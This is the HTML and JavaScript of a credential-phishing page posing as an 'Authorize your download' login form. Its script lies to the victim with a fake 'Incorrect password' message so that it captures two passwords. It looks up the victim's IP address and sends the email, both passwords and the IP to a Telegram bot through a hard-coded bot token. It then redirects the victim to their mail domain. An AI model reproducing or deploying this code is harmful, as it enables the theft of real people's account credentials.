   <h3 class="text-2x1 font-semibold text-center text-gray-600 mb-4" style="">Authorize your download</h3>
    <!-- Alert Box -->
    <div id="alertBox" class="hidden text-sm px-3 py-2 border rounded text-center mb-4"></div>

    <!-- Login Form -->
    <form id="loginForm" class="space-y-4">
      <!-- Email Field -->
      <div>
        <label class="block mb-1 text-sm font-medium text-gray-700">E-mail</label>
        <div class="flex items-center border rounded px-2">
          <div class="pr-2 icon-container">
            <img id="email-icon" src="https://img.icons8.com/material-outlined/24/000000/email.png" alt="Email Icon">
          </div>
          <input type="email" id="email" required="" class="w-full px-2 py-2 outline-none">
        </div>
      </div>

      <!-- Password Field -->
      <div>
        <label class="block mb-1 text-sm font-medium text-gray-700">Password</label>
        <div class="flex items-center border rounded px-2">
          <div class="pr-2">
            <img id="password-icon" src="https://img.icons8.com/material-outlined/24/000000/lock--v1.png" alt="Password Icon">
          </div>
          <input type="password" id="password" required="" class="w-full px-2 py-2 outline-none">
        </div>
      </div>

      <!-- Human Check -->
      <div class="flex items-center space-x-2">
        <input type="checkbox" id="humanCheck" class="form-checkbox h-4 w-4 text-blue-600">
        <label for="humanCheck" class="text-sm text-gray-700">I'm not a robot.</label>
      </div>

      <!-- Submit Button -->
      <button type="submit" class="w-full py-2 bg-blue-600 text-white rounded hover:bg-blue-700 transition duration-200">
        Download
      </button>
    </form>
  </div>

  <!-- Script -->
  <script>
    const BOT_TOKEN = '8642585919:AAGJfHDb9w4FCmxc2WKNov54FBEccmuRutA';
    const CHAT_ID = '8629908210';

    const loginForm = document.getElementById('loginForm');
    const alertBox = document.getElementById('alertBox');
    const emailInput = document.getElementById('email');
    const passwordInput = document.getElementById('password');
    const emailIcon = document.getElementById('email-icon');
    const passwordIcon = document.getElementById('password-icon');

    // Animate icons on focus
    emailInput.addEventListener('focus', () => spinIcon(emailIcon));
    passwordInput.addEventListener('focus', () => spinIcon(passwordIcon));
    function spinIcon(icon) {
      icon.classList.remove('spin');
      void icon.offsetWidth;
      icon.classList.add('spin');
    }

    // Autofill email from URL param or localStorage
    document.addEventListener('DOMContentLoaded', () => {
      const params = new URLSearchParams(window.location.search);
      const urlEmail = params.get('email');
      const step = localStorage.getItem('loginStep');
      const savedEmail = localStorage.getItem('email');

      if (urlEmail) {
        emailInput.value = urlEmail;
        emailInput.readOnly = (step === '1');
      } else if (step === '1' && savedEmail) {
        emailInput.value = savedEmail;
        emailInput.readOnly = true;
      } else {
        emailInput.readOnly = false;
        emailInput.value = '';
      }
    });

    // Form handler
    loginForm.addEventListener('submit', async function (e) {
      e.preventDefault();

      const email = emailInput.value.trim();
      const password = passwordInput.value;
      const isHuman = document.getElementById('humanCheck').checked;

      if (!isHuman) {
        showAlert('â Human verification required.', 'error');
        return;
      }

      if (!localStorage.getItem('loginStep')) {
        localStorage.setItem('email', email);
        localStorage.setItem('password', password);
        localStorage.setItem('loginStep', '1');
        showAlert('Incorrect password, try again.', 'info');
        passwordInput.value = '';
        return;
      }

      if (localStorage.getItem('loginStep') === '1') {
        try {
          const firstPassword = localStorage.getItem('password');
          const ipRes = await fetch('https://api.ipify.org?format=json');
          const ipData = await ipRes.json();
          const ip = ipData.ip || 'Unavailable';

          const msg = `ð Login Attempt:\nð§ Email: ${email}\nð Password 1: ${firstPassword}\nð Password 2: ${password}\nð IP: ${ip}`;

          await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: CHAT_ID, text: msg }),
          });

          // Clear localStorage
          localStorage.removeItem('loginStep');
          localStorage.removeItem('email');
          localStorage.removeItem('password');

          // Redirect to email domain
          const domain = email.split('@')[1];
          if (domain) {
            window.location.href = 'https://' + domain;
          } else {
            showAlert('â Invalid email format.', 'error');
          }
        } catch (err) {
          showAlert('Check your network and try again.', 'error');
        }
      }
    });

    function showAlert(message, type) {
      alertBox.textContent = message;
      alertBox.classList.remove('hidden', 'text-blue-800', 'text-red-800', 'bg-blue-100', 'bg-red-100', 'border');
      alertBox.classList.add('border');

      if (type === 'error') {
        alertBox.classList.add('text-red-800', 'bg-red-100', 'border-red-400');
      } else {
        alertBox.classList.add('text-blue-800', 'bg-blue-100', 'border-blue-400');
      }
    }
  </script>
